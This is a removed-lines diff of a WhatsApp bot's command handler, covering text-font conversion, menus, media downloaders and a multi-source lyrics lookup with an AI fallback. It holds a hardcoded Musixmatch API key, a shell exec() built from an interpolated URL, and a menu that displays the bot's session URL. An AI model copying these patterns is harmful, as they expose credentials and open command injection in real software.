-            aesthetic:     {a:'ａ',b:'ｂ',c:'ｃ',d:'ｄ',e:'ｅ',f:'ｆ',g:'ｇ',h:'ｈ',i:'ｉ',j:'ｊ',k:'ｋ',l:'ｌ',m:'ｍ',n:'ｎ',o:'ｏ',p:'ｐ',q:'ｑ',r:'ｒ',s:'ｓ',t:'ｔ',u:'ｕ',v:'ｖ',w:'ｗ',x:'ｘ',y:'ｙ',z:'ｚ',A:'Ａ',B:'Ｂ',C:'Ｃ',D:'Ｄ',E:'Ｅ',F:'Ｆ',G:'Ｇ',H:'Ｈ',I:'Ｉ',J:'Ｊ',K:'Ｋ',L:'Ｌ',M:'Ｍ',N:'Ｎ',O:'Ｏ',P:'Ｐ',Q:'Ｑ',R:'Ｒ',S:'Ｓ',T:'Ｔ',U:'Ｕ',V:'Ｖ',W:'Ｗ',X:'Ｘ',Y:'Ｙ',Z:'Ｚ','0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'６','7':'７','8':'８','9':'９'},
-            tiny:          {a:'ᵃ',b:'ᵇ',c:'ᶜ',d:'ᵈ',e:'ᵉ',f:'ᶠ',g:'ᵍ',h:'ʰ',i:'ⁱ',j:'ʲ',k:'ᵏ',l:'ˡ',m:'ᵐ',n:'ⁿ',o:'ᵒ',p:'ᵖ',q:'q',r:'ʳ',s:'ˢ',t:'ᵗ',u:'ᵘ',v:'ᵛ',w:'ʷ',x:'ˣ',y:'ʸ',z:'ᶻ',A:'ᴬ',B:'ᴮ',C:'ᶜ',D:'ᴰ',E:'ᴱ',F:'ᶠ',G:'ᴳ',H:'ᴴ',I:'ᴵ',J:'ᴶ',K:'ᴷ',L:'ᴸ',M:'ᴹ',N:'ᴺ',O:'ᴼ',P:'ᴾ',Q:'Q',R:'ᴿ',S:'ˢ',T:'ᵀ',U:'ᵁ',V:'ᵛ',W:'ᵂ',X:'ˣ',Y:'ʸ',Z:'ᶻ'},
-            gothic:        {a:'𝖆',b:'𝖇',c:'𝖈',d:'𝖉',e:'𝖊',f:'𝖋',g:'𝖌',h:'𝖍',i:'𝖎',j:'𝖏',k:'𝖐',l:'𝖑',m:'𝖒',n:'𝖓',o:'𝖔',p:'𝖕',q:'𝖖',r:'𝖗',s:'𝖘',t:'𝖙',u:'𝖚',v:'𝖛',w:'𝖜',x:'𝖝',y:'𝖞',z:'𝖟',A:'𝕬',B:'𝕭',C:'𝕮',D:'𝕯',E:'𝕰',F:'𝕱',G:'𝕲',H:'𝕳',I:'𝕴',J:'𝕵',K:'𝕶',L:'𝕷',M:'𝕸',N:'𝕹',O:'𝕺',P:'𝕻',Q:'𝕼',R:'𝕽',S:'𝕾',T:'𝕿',U:'𝖀',V:'𝖁',W:'𝖂',X:'𝖃',Y:'𝖄',Z:'𝖅'},
-            inverted:      {a:'ɐ',b:'q',c:'ɔ',d:'p',e:'ǝ',f:'ɟ',g:'ƃ',h:'ɥ',i:'ᴉ',j:'ɾ',k:'ʞ',l:'l',m:'ɯ',n:'u',o:'o',p:'d',q:'b',r:'ɹ',s:'s',t:'ʇ',u:'n',v:'ʌ',w:'ʍ',x:'x',y:'ʎ',z:'z',A:'∀',B:'q',C:'Ɔ',D:'p',E:'Ǝ',F:'Ⅎ',G:'פ',H:'H',I:'I',J:'ɾ',K:'ʞ',L:'˥',M:'W',N:'N',O:'O',P:'Ԁ',Q:'Q',R:'ɹ',S:'S',T:'┴',U:'∩',V:'Λ',W:'M',X:'X',Y:'ʎ',Z:'Z'},
-            mirror:        {a:'ɒ',b:'d',c:'ɔ',d:'b',e:'ɘ',f:'ʇ',g:'ϱ',h:'ʜ',i:'i',j:'ᴉ',k:'ʞ',l:'l',m:'m',n:'n',o:'o',p:'q',q:'p',r:'ɿ',s:'ƨ',t:'ƚ',u:'u',v:'v',w:'w',x:'x',y:'y',z:'z',A:'A',B:'ᗺ',C:'Ɔ',D:'ᗡ',E:'Ǝ',F:'ꟻ',G:'Ꭾ',H:'H',I:'I',J:'Ꮈ',K:'ꓘ',L:'⅃',M:'M',N:'И',O:'O',P:'ꟼ',Q:'Ọ',R:'Я',S:'Ƨ',T:'T',U:'U',V:'V',W:'W',X:'X',Y:'Y',Z:'Z'},
-            currency:      {a:'₳',b:'฿',c:'₵',d:'₫',e:'€',f:'₣',g:'₲',h:'♄',i:'ł',j:'ʝ',k:'₭',l:'₤',m:'₥',n:'₦',o:'ø',p:'₱',q:'q',r:'®',s:'$',t:'₮',u:'µ',v:'√',w:'₩',x:'×',y:'¥',z:'z',A:'₳',B:'฿',C:'₵',D:'₫',E:'€',F:'₣',G:'₲',H:'♄',I:'ł',J:'ʝ',K:'₭',L:'₤',M:'₥',N:'₦',O:'ø',P:'₱',Q:'Q',R:'®',S:'$',T:'₮',U:'µ',V:'√',W:'₩',X:'×',Y:'¥',Z:'Z'},
-            dotted:        {a:'ȧ',b:'ḃ',c:'ċ',d:'ḋ',e:'ė',f:'ḟ',g:'ġ',h:'ḣ',i:'ı',j:'j',k:'k',l:'l',m:'ṁ',n:'ṅ',o:'ȯ',p:'ṗ',q:'q',r:'ṙ',s:'ṡ',t:'ṫ',u:'u',v:'v',w:'ẇ',x:'ẋ',y:'ẏ',z:'ż',A:'Ȧ',B:'Ḃ',C:'Ċ',D:'Ḋ',E:'Ė',F:'Ḟ',G:'Ġ',H:'Ḣ',I:'İ',J:'J',K:'K',L:'L',M:'Ṁ',N:'Ṅ',O:'Ȯ',P:'Ṗ',Q:'Q',R:'Ṙ',S:'Ṡ',T:'Ṫ',U:'U',V:'V',W:'Ẇ',X:'Ẋ',Y:'Ẏ',Z:'Ż'},
-            oldeng:        {a:'𝒶',b:'𝒷',c:'𝒸',d:'𝒹',e:'𝑒',f:'𝒻',g:'𝑔',h:'𝒽',i:'𝒾',j:'𝒿',k:'𝓀',l:'𝓁',m:'𝓂',n:'𝓃',o:'𝑜',p:'𝓅',q:'𝓆',r:'𝓇',s:'𝓈',t:'𝓉',u:'𝓊',v:'𝓋',w:'𝓌',x:'𝓍',y:'𝓎',z:'𝓏',A:'𝒜',B:'ℬ',C:'𝒞',D:'𝒟',E:'ℰ',F:'ℱ',G:'𝒢',H:'ℋ',I:'ℐ',J:'𝒥',K:'𝒦',L:'ℒ',M:'ℳ',N:'𝒩',O:'𝒪',P:'𝒫',Q:'𝒬',R:'ℛ',S:'𝒮',T:'𝒯',U:'𝒰',V:'𝒱',W:'𝒲',X:'𝒳',Y:'𝒴',Z:'𝒵'}
-        }
-        const _activeFont = global.ownerFontMode
-        const _map = _fontMaps[_activeFont]
-        if (_map) {
-            let _converted
-            if (_activeFont === 'wide') {
-                _converted = [...budy].map(c=>{let code=c.charCodeAt(0);return (code>=33&&code<=126)?String.fromCharCode(code+65248):c===' '?'\u3000':c}).join('')
-            } else if (_activeFont === 'upsidedown') {
-                const _ud = {a:'ɐ',b:'q',c:'ɔ',d:'p',e:'ǝ',f:'ɟ',g:'ƃ',h:'ɥ',i:'ᴉ',j:'ɾ',k:'ʞ',l:'l',m:'ɯ',n:'u',o:'o',p:'d',q:'b',r:'ɹ',s:'s',t:'ʇ',u:'n',v:'ʌ',w:'ʍ',x:'x',y:'ʎ',z:'z',A:'∀',B:'q',C:'Ɔ',D:'p',E:'Ǝ',F:'Ⅎ',G:'פ',H:'H',I:'I',J:'ɾ',K:'ʞ',L:'˥',M:'W',N:'N',O:'O',P:'Ԁ',Q:'Q',R:'ɹ',S:'S',T:'┴',U:'∩',V:'Λ',W:'M',X:'X',Y:'ʎ',Z:'Z',' ':' '}
-                _converted = [...budy].map(c=>_ud[c]||c).reverse().join('')
-            } else if (_activeFont === 'strikethrough') {
-                _converted = [...budy].map(c=>c===' '?' ':c+'̶').join('')
-            } else if (_activeFont === 'underline') {
-                _converted = [...budy].map(c=>c===' '?' ':c+'̲').join('')
-            } else {
-                _converted = [...budy].map(c=>_map[c]||c).join('')
-            }
-            // Only act if conversion actually changed something
-            if (_converted !== budy) {
-                // Edit in-place — shows "Edited" label, no deletion notice
-                await X.sendMessage(m.chat, { text: _converted, edit: m.key })
-            }
-        }
-    } catch (_fe) {
-        // Silently ignore font mode errors — never crash normal flow
-    }
-    return
-}
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// jangan di apa apain
-switch(command) {
-// awas error
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// help command
-case 'help': {
-    await X.sendMessage(m.chat, { react: { text: '📋', key: m.key } })
-const helpText = `╔══════════════════════════╗
-║  📋 *QUICK HELP GUIDE*
-╚══════════════════════════╝
-
-  ├ .menu            › all commands
-  ├ .menu ai         › AI tools
-  ├ .menu tools      › utilities
-  ├ .menu owner      › bot settings
-  ├ .menu group      › group mgmt
-  ├ .menu downloader › downloads
-  ├ .menu search     › search
-  └ .menu sticker    › stickers
-┃➤ .menu games — ɢᴀᴍᴇꜱ
-┗❒
-
-┏❒ *ᴘᴏᴘᴜʟᴀʀ ᴄᴏᴍᴍᴀɴᴅꜱ* ❒
-┃➤ .ai [Qᴜᴇꜱᴛɪᴏɴ]
-┃➤ .sticker ʀᴇᴘʟʏ ᴍᴇᴅɪᴀ
-┃➤ .play [ꜱᴏɴɢ]
-┃➤ .ig [ᴜʀʟ]
-┃➤ .tt [ᴜʀʟ]
-┃➤ .toimage
-┃➤ .save ʀᴇᴘʟʏ ᴍꜱɢ
-┗❒
-
-┏❒ *ᴄᴏɴᴛᴀᴄᴛ* ❒
-┃➤ wa.me/254748340864
-┃➤ ᴛᴇʟᴇɢʀᴀᴍ: @toosiitech
-┗❒
-
-_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴛᴏᴏꜱɪɪ ᴛᴇᴄʜ_`
-const helpThumb = global.botPic || global.thumb || 'https://files.catbox.moe/qbcebp.jpg'
-X.sendMessage(m.chat, { image: { url: helpThumb }, caption: helpText }, { quoted: m })
-break
-}
-
-// system menu
-case 'menu': {
-    await X.sendMessage(m.chat, { react: { text: '📋', key: m.key } })
-// menu list - clear cache to always load fresh
-const menuFiles = ['aimenu','toolsmenu','groupmenu','ownermenu','searchmenu','gamemenu','stickermenu','othermenu','downloadermenu','textmakermenu'];
-menuFiles.forEach(f => { try { delete require.cache[require.resolve('./library/menulist/' + f)]; } catch {} });
-const aiMenu = require('./library/menulist/aimenu');
-const toolsMenu = require('./library/menulist/toolsmenu');
-const groupMenu = require('./library/menulist/groupmenu');
-const ownerMenu = require('./library/menulist/ownermenu');
-const searchMenu = require('./library/menulist/searchmenu');
-const gameMenu = require('./library/menulist/gamemenu');
-const stickerMenu = require('./library/menulist/stickermenu');
-const otherMenu = require('./library/menulist/othermenu');
-const downloaderMenu = require('./library/menulist/downloadermenu');
-const textmakerMenu = require('./library/menulist/textmakermenu');
-
-  let subcmd = args[0] ? args[0].toLowerCase() : '';
-
-  let infoBot = `╔══════════════════════════╗
-║   ⚡ *TOOSII-XD ULTRA*
-╚══════════════════════════╝
-
-  👋 Hey *${pushname}*! ${waktuucapan}
-
-  ├ 🤖 *Bot*      › ${botname}
-  ├ 👑 *Owner*    › ${ownername}
-  ├ 🔢 *Version*  › v${botver}
-  ├ ⚙️  *Mode*     › ${typebot}
-  ├ 📋 *Commands* › ${totalfitur()}
-  ├ 📞 *Contact*  › wa.me/254748340864
-  ├ ✈️  *Telegram* › t.me/toosiitech
-  └ 🔑 *Session*  › ${global.sessionUrl}
-
-┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
-  _Type_ *.menu [category]* _to filter_
-  ai · tools · owner · group · downloader
-  search · sticker · games · other · textmaker
-┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
-
-  ⬇️  *COMMAND LIST*`.trim();
-
-  let menu = '';
-
-  if (subcmd === 'ai') menu = aiMenu;
-  else if (subcmd === 'tools') menu = toolsMenu;
-  else if (subcmd === 'group') menu = groupMenu;
-  else if (subcmd === 'owner') menu = ownerMenu;
-  else if (subcmd === 'search') menu = searchMenu;
-  else if (subcmd === 'games') menu = gameMenu;
-  else if (subcmd === 'sticker') menu = stickerMenu;  
-  else if (subcmd === 'other') menu = otherMenu;    
-  else if (subcmd === 'downloader') menu = downloaderMenu;
-  else if (subcmd === 'textmaker') menu = textmakerMenu;
-  else if (subcmd === 'all') {
-    menu = [
-      otherMenu,
-      downloaderMenu,
-      stickerMenu,
-      ownerMenu,
-      groupMenu,
-      toolsMenu,
-      gameMenu,
-      searchMenu,
-      aiMenu,
-      textmakerMenu
-    ].join('\n');
-  } else {
-    menu = [
-      otherMenu,
-      downloaderMenu,
-      stickerMenu,
-      ownerMenu,
-      groupMenu,
-      toolsMenu,
-      gameMenu,
-      searchMenu,
-      aiMenu,
-      textmakerMenu
-    ].join('\n');
-  }
-
-  let fullMenu = `${infoBot}\n${menu}`;
-
-  await X.sendMessage(
-    m.chat,
-    {
-      text: fullMenu,
-      contextInfo: {
-        forwardingScore: 999,
-        isForwarded: true,
-        mentionedJid: [sender],
-        externalAdReply: {
-          title: "TOOSII-XD ULTRA",
-          body: "Toosii Tech",
-          thumbnail: fs.readFileSync('./media/thumb.png'),
-          sourceUrl: wagc,
-          mediaType: 1,
-          renderLargerThumbnail: true
-        }
-      }
-    },
-    { quoted: m }
-  );
-}
-break;
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Download Features
-case 'mfdl':
-case 'mediafire': {
-    await X.sendMessage(m.chat, { react: { text: '📥', key: m.key } })
- if (!text) return reply('Please provide a MediaFire link')
-  try {
-    const api = await fetchJson(`https://api.vreden.web.id/api/mediafiredl?url=${encodeURIComponent(text)}`)
-    if (!api.status || !api.result || !api.result[0]) return reply('Failed to get data from API.')
-
-    const data = api.result[0]
-    const fileNama = decodeURIComponent(data.nama || 'file.zip')
-    const extension = fileNama.split('.').pop().toLowerCase()
-
-    const res = await axios.get(data.link, { responseType: 'arraybuffer' })
-    const media = Buffer.from(res.data)
-
-    let mimetype = ''
-    if (extension === 'mp4') mimetype = 'video/mp4'
-    else if (extension === 'mp3') mimetype = 'audio/mp3'
-    else mimetype = `application/${extension}`
-
-    await X.sendMessage(m.chat, {
-      document: media,
-      fileName: fileNama,
-      mimetype: mimetype
-    }, { quoted: m })
-  } catch (err) {
-    console.error(err)
-    reply('Download error: ' + err.message)
-  }
-}
-break
-case 'ig':
-case 'instagram': {
-    await X.sendMessage(m.chat, { react: { text: '📸', key: m.key } })
-    if (!text) return reply("Please provide the Instagram link");
-    try {
-        const mediaUrl = await igdl(text);
-        if (!mediaUrl || !mediaUrl[0] || !mediaUrl[0].url) return reply('Failed to download. The link may be invalid.');
-        const url_media = mediaUrl[0].url;
-        try {
-            const response = await axios.head(url_media); 
-            const contentType = response.headers['content-type'];
-            if (contentType && contentType.startsWith('image/')) {
-                await safeSendMedia(m.chat, { image: { url: url_media}, caption: 'Done!' }, {}, { quoted: m });
-            } else {
-                await safeSendMedia(m.chat, { video: { url: url_media}, caption: 'Done!' }, {}, { quoted: m });
-            }
-        } catch(e) {
-           console.log('IG error:', e.message)
-           reply('An error occurred while downloading. Please try again.')
-        }
-    } catch(e) {
-        console.log('IG error:', e.message)
-        reply('An error occurred while downloading. Please try again.')
-    }
-}
-break
-
-case 'tt': 
-case 'tiktok': {
-    await X.sendMessage(m.chat, { react: { text: '🎵', key: m.key } })
-if (!text) return reply(`Example: ${prefix + command} <tiktok link>`)
-try {
-    let data = await fg.tiktok(text)
-    if (!data || !data.result) return reply('Failed to download. The link may be invalid.')
-    let json = data.result
-    let caption = `[ TIKTOK DOWNLOAD ]\n\n`
-    caption += `*Username* : ${json.author?.nickname || 'Unknown'}\n`
-    caption += `*Title* : ${json.title || '-'}\n`
-    caption += `*Likes* : ${json.digg_count || 0}\n`
-    caption += `*Comments* : ${json.comment_count || 0}\n`
-    caption += `*Shares* : ${json.share_count || 0}\n`
-    caption += `*Plays* : ${json.play_count || 0}\n`
-    caption += `*Duration* : ${json.duration || '-'}`
-    if (json.images && json.images.length) {
-        for (const k of json.images) {
-            if (k) await safeSendMedia(m.chat, { image: { url: k }}, {}, { quoted: m });
-        }
-    } else if (json.play) {
-        await safeSendMedia(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, {}, { quoted: m });
-        if (json.music) {
-            await sleep(3000);
-            await safeSendMedia(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, {}, { quoted: m });
-        }
-    } else {
-        reply('Failed to download. No media URL found.')
-    }
-} catch (e) {
-    console.log('TikTok error:', e)
-    reply('An error occurred while downloading. Please try again.')
-}
-}
-break
-
-case 'fb':
-case 'fbdl':
-case 'facebook' : {
-if (!text) return reply('Please provide the Facebook URL')
-    try {
-      let res = await fdown.download(text);
-      if (res && res.length > 0) {
-        let videoData = res[0]; 
-        let videoUrl = videoData.hdQualityLink || videoData.normalQualityLink; 
-        if (videoUrl) {
-          let caption = `*Title:* ${videoData.title || '-'}\n*Description:* ${videoData.description || '-'}\n*Duration:* ${videoData.duration || '-'}`;
-          await safeSendMedia(m.chat, { 
-            video: { url: videoUrl }, 
-            caption: caption, 
-            mimetype: 'video/mp4'
-          }, {}, { quoted: m });
-        } else {
-          reply('Failed to get video download URL.')
-        }
-      } else {
-        return reply('Failed to download. The link may be invalid.')
-      }
-    } catch (e) {
-      console.log(e);
-      reply('An error occurred while downloading. Please try again.')
-    }
-  }
-break
-case 'play':
-case 'song':
-case 'music':
-case 'ytplay': {
-    await X.sendMessage(m.chat, { react: { text: '🎵', key: m.key } })
-    if (!text) return reply('What song do you want to search for?\n\nExample: .play Juice WRLD Lucid Dreams')
-    try {
-        let search = await yts(text);
-        if (!search || !search.all || !search.all.length) return reply('No results found.')
-        let firstVideo = search.all.find(v => v.type === 'video') || search.all[0];
-        let videoTitle = firstVideo.title || 'Unknown Title'
-        let videoAuthor = firstVideo.author?.name || firstVideo.author || 'Unknown Artist'
-        let cleanName = `${videoAuthor} - ${videoTitle}.mp3`.replace(/[<>:"/\\|?*]/g, '')
-        let videoId = firstVideo.videoId || firstVideo.url.split('v=')[1]?.split('&')[0]
-
-        let downloaded = false
-        let audioBuffer = null
-
-        // Method 1: loader.to API (tested & working)
-        try {
-            let initRes = await fetch(`https://loader.to/ajax/download.php?format=mp3&url=${encodeURIComponent(firstVideo.url)}`)
-            let initData = await initRes.json()
-            if (initData.success && initData.id) {
-                let dlId = initData.id
-                let attempts = 0
-                while (attempts < 30) {
-                    await new Promise(r => setTimeout(r, 3000))
-                    let progRes = await fetch(`https://loader.to/ajax/progress.php?id=${dlId}`)
-                    let progData = await progRes.json()
-                    if (progData.success === 1 && progData.progress >= 1000 && progData.download_url) {
-                        audioBuffer = await getBuffer(progData.download_url)
-                        if (audioBuffer && audioBuffer.length > 10000) downloaded = true
-                        break
-                    }
-                    if (progData.progress < 0) break
-                    attempts++
-                }
-            }
-        } catch (e1) {
-            console.log('loader.to failed:', e1.message)
-        }
-
-        // Method 2: ytdl-core (built-in dependency)
-        if (!downloaded) {
-            try {
-                const ytdl = require('@distube/ytdl-core')
-                let info = await ytdl.getInfo(firstVideo.url)
-                let format = ytdl.chooseFormat(info.formats, { quality: 'highestaudio', filter: 'audioonly' })
-                if (!format) format = ytdl.chooseFormat(info.formats, { filter: f => f.hasAudio })
-                if (format) {
-                    let chunks = []
-                    await new Promise((resolve, reject) => {
-                        let stream = ytdl(firstVideo.url, { format: format })
-                        stream.on('data', chunk => chunks.push(chunk))
-                        stream.on('end', resolve)
-                        stream.on('error', reject)
-                        setTimeout(() => { stream.destroy(); reject(new Error('timeout')) }, 120000)
-                    })
-                    audioBuffer = Buffer.concat(chunks)
-                    if (audioBuffer.length > 10000) downloaded = true
-                }
-            } catch (e2) {
-                console.log('ytdl-core failed:', e2.message)
-            }
-        }
-
-        // Method 3: yt-dlp binary fallback
-        if (!downloaded) {
-            try {
-                let tmpDir = path.join(__dirname, 'tmp')
-                if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true })
-                let tmpFile = path.join(tmpDir, `play_${Date.now()}.mp3`)
-                let tmpBase = tmpFile.replace('.mp3', '')
-                await new Promise((resolve, reject) => {
-                    exec(`yt-dlp -x --audio-format mp3 --audio-quality 0 --no-playlist --max-filesize 50M -o "${tmpBase}.%(ext)s" "${firstVideo.url}"`, { timeout: 120000 }, (err) => {
-                        if (err) reject(err)
-                        else resolve()
-                    })
-                })
-                if (!fs.existsSync(tmpFile)) {
-                    let baseName = path.basename(tmpBase)
-                    let candidates = fs.readdirSync(tmpDir).filter(f => f.startsWith(baseName))
-                    if (candidates.length > 0) tmpFile = path.join(tmpDir, candidates[0])
-                }
-                if (fs.existsSync(tmpFile)) {
-                    audioBuffer = fs.readFileSync(tmpFile)
-                    if (audioBuffer.length > 10000) downloaded = true
-                    try { fs.unlinkSync(tmpFile) } catch(e) {}
-                }
-            } catch (e3) {
-                console.log('yt-dlp failed:', e3.message)
-            }
-        }
-
-        if (downloaded && audioBuffer) {
-            let thumbBuffer = null
-            try { thumbBuffer = await getBuffer(firstVideo.thumbnail) } catch {}
-            let songInfo = `🎵 *Now Playing*\n\n`
-            songInfo += `📌 *Title:* ${videoTitle}\n`
-            songInfo += `🎤 *Artist:* ${videoAuthor}\n`
-            songInfo += `⏱️ *Duration:* ${firstVideo.timestamp}\n`
-            songInfo += `👁️ *Views:* ${firstVideo.views}`
-            if (thumbBuffer) {
-                await X.sendMessage(m.chat, { image: thumbBuffer, caption: songInfo }, { quoted: m })
-            } else {
-                await X.sendMessage(m.chat, { text: songInfo }, { quoted: m })
-            }
-            await X.sendMessage(m.chat, {
-                document: audioBuffer,
-                mimetype: 'audio/mpeg',
-                fileName: cleanName
-            }, { quoted: m })
-        } else {
-            reply(`🎵 *${videoTitle}*\nArtist: ${videoAuthor}\nDuration: ${firstVideo.timestamp}\n\n⚠️ Audio download failed. Please try again later.`)
-        }
-    } catch (e) {
-        console.log(e)
-        reply('An error occurred while searching. Please try again.')
-    }
-}
-break;
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Lyrics Command — multi-source with fallback chain
-case 'lyrics':
-case 'lyric':
-case 'songlyrics': {
-    await X.sendMessage(m.chat, { react: { text: '🎵', key: m.key } })
-    if (!text) return reply(
-`🎵 *Lyrics Search*
-
-Usage: ${prefix}lyrics [song name] - [artist]
-Examples:
-• ${prefix}lyrics Lucid Dreams Juice WRLD
-• ${prefix}lyrics Blinding Lights - The Weeknd
-• ${prefix}lyrics HUMBLE Kendrick Lamar`)
-
-    await X.sendMessage(m.chat, { react: { text: '🎵', key: m.key } })
-
-    // Parse "song - artist" or "song artist" from input
-    let _lyrQuery = text.trim()
-    let _lyrSong = _lyrQuery
-    let _lyrArtist = ''
-    const _dashSplit = _lyrQuery.split(/\s*-\s*/)
-    if (_dashSplit.length >= 2) {
-        _lyrSong = _dashSplit[0].trim()
-        _lyrArtist = _dashSplit.slice(1).join(' ').trim()
-    }
-
-    let _lyrResult = null
-    let _lyrSource = ''
-
-    // ── Source 1: lyrics.ovh (free, no key) ─────────────────────────
-    if (!_lyrResult && _lyrArtist) {
-        try {
-            const _r1 = await axios.get(
-                `https://api.lyrics.ovh/v1/${encodeURIComponent(_lyrArtist)}/${encodeURIComponent(_lyrSong)}`,
-                { timeout: 10000 }
-            )
-            if (_r1.data?.lyrics?.trim().length > 10) {
-                _lyrResult = { lyrics: _r1.data.lyrics.trim(), title: _lyrSong, artist: _lyrArtist }
-                _lyrSource = 'lyrics.ovh'
-            }
-        } catch {}
-    }
-
-    // ── Source 2: Lyrics.ovh search (no artist needed) ───────────────
-    if (!_lyrResult) {
-        try {
-            const _r2 = await axios.get(
-                `https://api.lyrics.ovh/suggest/${encodeURIComponent(_lyrQuery)}`,
-                { timeout: 10000 }
-            )
-            const _hit = _r2.data?.data?.[0]
-            if (_hit) {
-                const _r2b = await axios.get(
-                    `https://api.lyrics.ovh/v1/${encodeURIComponent(_hit.artist?.name || '')}/${encodeURIComponent(_hit.title || '')}`,
-                    { timeout: 10000 }
-                )
-                if (_r2b.data?.lyrics?.trim().length > 10) {
-                    _lyrResult = {
-                        lyrics: _r2b.data.lyrics.trim(),
-                        title: _hit.title || _lyrSong,
-                        artist: _hit.artist?.name || _lyrArtist,
-                        album: _hit.album?.title || '',
-                        thumbnail: _hit.album?.cover_medium || ''
-                    }
-                    _lyrSource = 'lyrics.ovh'
-                }
-            }
-        } catch {}
-    }
-
-    // ── Source 3: Musixmatch unofficial ──────────────────────────────
-    if (!_lyrResult) {
-        try {
-            const _mmSearch = await axios.get(
-                `https://api.musixmatch.com/ws/1.1/track.search?q_track_artist=${encodeURIComponent(_lyrQuery)}&page_size=1&page=1&s_track_rating=desc&apikey=0e9ce71d2f2c9251f74a9bfcd7e3aead`,
-                { timeout: 10000 }
-            )
-            const _mmTrack = _mmSearch.data?.message?.body?.track_list?.[0]?.track
-            if (_mmTrack) {
-                const _mmLyr = await axios.get(
-                    `https://api.musixmatch.com/ws/1.1/track.lyrics.get?track_id=${_mmTrack.track_id}&apikey=0e9ce71d2f2c9251f74a9bfcd7e3aead`,
-                    { timeout: 10000 }
-                )
-                const _mmText = _mmLyr.data?.message?.body?.lyrics?.lyrics_body?.trim()
-                if (_mmText && _mmText.length > 10 && !_mmText.includes('******* This Lyrics')) {
-                    _lyrResult = {
-                        lyrics: _mmText,
-                        title: _mmTrack.track_name || _lyrSong,
-                        artist: _mmTrack.artist_name || _lyrArtist
-                    }
-                    _lyrSource = 'Musixmatch'
-                }
-            }
-        } catch {}
-    }
-
-    // ── Source 4: lrclib.net (has synced + plain lyrics, no key) ─────
-    if (!_lyrResult) {
-        try {
-            const _lcQ = encodeURIComponent(_lyrQuery)
-            const _lcRes = await axios.get(
-                `https://lrclib.net/api/search?q=${_lcQ}`,
-                { timeout: 10000 }
-            )
-            const _lcHit = _lcRes.data?.[0]
-            if (_lcHit && (_lcHit.plainLyrics || _lcHit.syncedLyrics)) {
-                // Prefer plain lyrics; strip timestamps from synced if needed
-                let _lcText = _lcHit.plainLyrics || ''
-                if (!_lcText && _lcHit.syncedLyrics) {
-                    _lcText = _lcHit.syncedLyrics
-                        .split('\n')
-                        .map(l => l.replace(/^\[\d+:\d+\.\d+\]\s*/, '').trim())
-                        .filter(Boolean)
-                        .join('\n')
-                }
-                if (_lcText.trim().length > 10) {
-                    _lyrResult = {
-                        lyrics: _lcText.trim(),
-                        title: _lcHit.trackName || _lyrSong,
-                        artist: _lcHit.artistName || _lyrArtist,
-                        album: _lcHit.albumName || ''
-                    }
-                    _lyrSource = 'lrclib.net'
-                }
-            }
-        } catch {}
-    }
-
-    // ── Source 5: Genius search via unofficial scrape helper ─────────
-    if (!_lyrResult) {
-        try {
-            const _gSearch = await axios.get(
-                `https://genius.com/api/search/multi?per_page=1&q=${encodeURIComponent(_lyrQuery)}`,
-                {
-                    timeout: 10000,
-                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
-                }
-            )
-            const _gHits = _gSearch.data?.response?.sections?.find(s => s.type === 'song')?.hits
-            const _gHit = _gHits?.[0]?.result
-            if (_gHit) {
-                // Scrape the Genius page for plain lyrics
-                const _gPage = await axios.get(_gHit.url, {
-                    timeout: 12000,
-                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
-                })
-                const _gHtml = _gPage.data || ''
-                // Extract lyrics from data-lyrics-container divs
-                const _lyricChunks = []
-                const _containerRe = /data-lyrics-container="true"[^>]*>([\s\S]*?)<\/div>/gi
-                let _cm
-                while ((_cm = _containerRe.exec(_gHtml)) !== null) {
-                    let _chunk = _cm[1]
-                        .replace(/<br\s*\/?>/gi, '\n')
-                        .replace(/<[^>]+>/g, '')
-                        .replace(/&amp;/g, '&').replace(/&quot;/g, '"')
-                        .replace(/&#x27;/g, "'").replace(/&lt;/g, '<').replace(/&gt;/g, '>')
-                        .replace(/&nbsp;/g, ' ')
-                    _lyricChunks.push(_chunk.trim())
-                }
-                const _gLyrics = _lyricChunks.join('\n\n').trim()
-                if (_gLyrics.length > 20) {
-                    _lyrResult = {
-                        lyrics: _gLyrics,
-                        title: _gHit.title || _lyrSong,
-                        artist: _gHit.primary_artist?.name || _lyrArtist,
-                        thumbnail: _gHit.song_art_image_thumbnail_url || ''
-                    }
-                    _lyrSource = 'Genius'
-                }
-            }
-        } catch {}
-    }
-
-    // ── Source 6: AI fallback — generate from knowledge ──────────────
-    if (!_lyrResult) {
-        try {
-            const _aiLyr = await _runChatBoAI(
-                `Please provide the full song lyrics for "${_lyrQuery}". Format: first line = "Title: [title]", second line = "Artist: [artist]", then a blank line, then the complete lyrics. If you don't know the exact lyrics, say UNKNOWN.`,
-                false
-            )
-            if (_aiLyr && !_aiLyr.includes('UNKNOWN') && _aiLyr.length > 50) {
-                const _aiLines = _aiLyr.split('\n')
-                const _aiTitle = (_aiLines.find(l => /^title:/i.test(l)) || '').replace(/^title:\s*/i, '').trim() || _lyrSong
-                const _aiArtist = (_aiLines.find(l => /^artist:/i.test(l)) || '').replace(/^artist:\s*/i, '').trim() || _lyrArtist
-                const _aiText = _aiLines.filter(l => !/^(title|artist):/i.test(l)).join('\n').trim()
-                if (_aiText.length > 20) {
-                    _lyrResult = { lyrics: _aiText, title: _aiTitle, artist: _aiArtist }
-                    _lyrSource = 'AI'
-                }
-            }
-        } catch {}
-    }
-
-    // ── No result found ───────────────────────────────────────────────
-    if (!_lyrResult) {
-        return reply(
-`❌ *Lyrics Not Found*
-
-Could not find lyrics for: *${_lyrQuery}*
-
-Tips:
-• Try: ${prefix}lyrics [song name] - [artist name]
-• Check spelling
-• Use English title if available`)
-    }
-
